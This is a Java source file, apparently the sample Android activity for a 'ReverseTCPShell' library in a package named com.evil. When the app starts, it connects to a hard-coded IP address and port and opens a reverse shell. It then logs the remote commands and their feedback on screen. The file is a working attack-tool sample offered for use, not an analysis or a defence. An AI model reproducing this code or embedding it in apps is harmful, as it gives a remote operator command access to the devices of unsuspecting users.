package com.evil.reversetcpshellandroid.sample;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.ListView;
import android.widget.TextView;

import com.evil.reversetcpshellandroid.library.ConnectErrorListener;
import com.evil.reversetcpshellandroid.library.ConnectListener;
import com.evil.reversetcpshellandroid.library.ReverseTCPShell;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private TextView textView;
    private ListView listView;
    List<String> logList = new ArrayList<>();
    private MyAdapter myAdapter;
    private ReverseTCPShell mShell;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        textView = (TextView) findViewById(R.id.text_view);
        listView = (ListView) findViewById(R.id.list_view);
        logList.clear();
        myAdapter = new MyAdapter();
        listView.setAdapter(myAdapter);
        final String ip = "192.168.1.135";
        final int port = 3333;
        ReverseTCPShell.connect(ip, port, new ConnectListener() {
            @Override
            public void connected(ReverseTCPShell shell) {
                mShell = shell;
                addText("成功连接至 "+ip +":"+port);
            }

            @Override
            public void receiveMessage(String msg) {
                addText("远程:\n"+msg);
            }

            @Override
            public void feedbackMessage(String msg) {
                addText("反馈:\n"+msg);
            }

            @Override
            public void stopped() {
                addText("连接结束");
            }
        }, new ConnectErrorListener() {
            @Override
            public void error(String msg) {
                addText("连接错误\n" + msg);
            }
        });
    }

    public class MyAdapter extends BaseAdapter {
        @Override
        public int getCount() {
            return logList.size() >= 1 ? logList.size() - 1 : 0;
        }

        @Override
        public Object getItem(int position) {
            return position;
        }

        @Override
        public long getItemId(int position) {
            return position;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            TextView textView = new TextView(parent.getContext());
            textView.setTextSize(20f);
            textView.setText(logList.get(position + 1));
            return textView;
        }
    }

    private void addText(String msg){
        textView.setText(msg);
        logList.add(0, msg);
        myAdapter.notifyDataSetChanged();
    }

}
